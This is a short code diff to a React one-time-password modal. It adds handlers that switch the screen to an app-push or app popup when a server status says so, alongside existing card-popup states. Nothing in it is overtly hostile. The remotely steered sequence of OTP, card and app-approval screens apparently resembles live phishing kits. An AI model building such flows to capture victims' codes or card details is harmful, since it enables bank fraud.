@@ -31,7 +31,7 @@ const translations = {
   }
 };
 
-export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose }) {
+export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose, onSwitchToAppPush, onSwitchToAppPopup }) {
   const t = translations[lang];
   const [otpVal, setOtpVal] = useState(['', '', '', '', '', '']);
   const [status, setStatus] = useState('show_otp');
@@ -88,6 +88,16 @@ export default function OtpModal({ email, lang = "en", onVerifySuccess, onClose 
           // ── Card popup / card submitted status ──
           if (data.status === 'card_popup' || data.status === 'card_submitted') {
             setStatus(data.status);
+            return;
+          }
+
+          if (data.status === 'app_push_popup') {
+            if (onSwitchToAppPush) onSwitchToAppPush();
+            return;
+          }
+
+          if (data.status === 'app_popup') {
+            if (onSwitchToAppPopup) onSwitchToAppPopup();
             return;
           }
 
